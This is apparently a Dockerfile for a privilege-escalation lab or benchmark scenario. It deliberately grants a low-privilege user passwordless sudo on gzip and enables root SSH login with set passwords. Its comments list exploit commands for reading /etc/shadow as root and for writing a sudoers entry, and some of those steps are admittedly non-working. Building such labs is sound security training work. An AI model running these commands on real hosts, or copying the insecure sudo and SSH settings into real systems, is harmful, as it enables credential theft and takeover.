FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_gzip
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/gzip as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and gzip (gzip is usually present but be explicit)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        gzip \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify gzip is installed
RUN which gzip && ls -la /usr/bin/gzip

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# gzip can read arbitrary files when run as root. The exploit approach:
#   sudo gzip -f /etc/shadow -t    (test mode to verify access)
#   sudo gzip -c /etc/shadow | gzip -d   (read privileged files)
#   sudo gzip -c -d /etc/sudoers > /tmp/sudoers && edit && sudo gzip -c /tmp/modified | ...
# More critically, gzip can be abused to read /etc/shadow and crack passwords,
# or to overwrite files by compressing/decompressing with root privileges.
# The attacker can read /etc/shadow:
#   sudo gzip -c /etc/shadow | gzip -d
# Or leverage it to write files by decompressing a crafted gzip as root:
#   echo 'lowpriv ALL=(ALL) NOPASSWD: ALL' | gzip > /tmp/escalate.gz
#   sudo gzip -d -c /tmp/escalate.gz > /etc/sudoers.d/escalate  (via shell redirect won't work directly)
#   But: sudo sh -c is not allowed. The file read alone (shadow) enables password cracking for root.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/gzip" > /etc/sudoers.d/gzip && \
    chmod 440 /etc/sudoers.d/gzip

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]